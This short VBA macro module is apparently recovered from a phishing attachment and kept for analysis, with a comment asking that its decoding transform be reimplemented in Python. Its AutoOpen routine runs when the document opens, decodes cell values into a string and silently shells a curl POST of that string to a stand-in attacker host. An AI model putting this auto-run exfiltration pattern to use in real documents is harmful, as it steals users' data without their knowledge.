Attribute VB_Name = "ThisDocument"
' Recovered from a phishing attachment. DO NOT EXECUTE this macro --
' reimplement the transform in Python instead.

Sub AutoOpen()
    Dim ws As Worksheet
    Set ws = ThisWorkbook.Sheets("Sheet1")
    Dim buf As String
    buf = ""
    Dim row As Long, col As Long
    Dim v As Variant
    For row = 1 To ws.UsedRange.Rows.Count
        For col = 1 To ws.UsedRange.Columns.Count
            v = ws.Cells(row, col).Value
            If IsNumeric(v) Then
                ' Each cell encodes one plaintext byte: b = (v - 78) / 3
                buf = buf & Chr(CByte((v - 78) / 3))
            End If
        Next col
    Next row
    ' Exfiltrate the decoded secret to the attacker's dropbox.
    Shell "curl -s -X POST http://attacker.example.com/exfil -d " & Chr(34) & buf & Chr(34), vbHide
End Sub
